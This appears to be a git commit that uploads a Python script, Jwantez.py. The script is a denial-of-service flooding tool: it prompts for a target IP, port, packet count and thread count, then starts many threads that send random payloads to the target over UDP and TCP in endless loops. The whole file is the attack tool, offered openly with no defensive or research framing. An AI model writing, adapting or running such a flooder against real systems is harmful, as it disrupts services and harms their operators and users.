779667da953e12b317637d7476bf8c97e6741404
Jwantez <108336455+Jwantez@users.noreply.github.com>
2022-06-28 17:29:33 +0700

    Add files via upload

---
+++ Jwantez.py
@@ -0,0 +1,94 @@
+import random
+import socket
+import threading
+import time
+import os,sys
+import random, socket, threading
+
+
+os.system("clear")
+print("""
+Part Of 𝙂𝙯𝙖𝙖𝙭𝙮𝙯""")
+print("\033[31m━━━ Gas? (y/n)")
+choice = str(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Host/IP")
+ip = str(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Port")
+port = int(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Pakets")    
+print("\033[31m━━━ Min Pakets 78000")
+times = int(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Threads")
+print("\033[31m━━━ Min Threads 28000")
+threads = int(input("┗━>\033[0m:"))
+def xxxx():
+  data = random._urandom(761)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack")
+
+def xxx():
+  data = random._urandom(761)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack")
+
+def xx():
+  data = random._urandom(761)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      s.close()
+      print("[!] Server Attack")
+
+def x():
+  data = random._urandom(761)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      s.close()
+      print("[!] Server Attack")
+
+for y in range(threads):
+  if choice == 'y':
+    th = threading.Thread(target = xxxx)
+    th.start()
+    th = threading.Thread(target = xxx)
+    th.start()
+    th = threading.Thread(target = xx)
+    th.start()
+else:
+    th = threading.Thread(target = x)
+    th.start() 
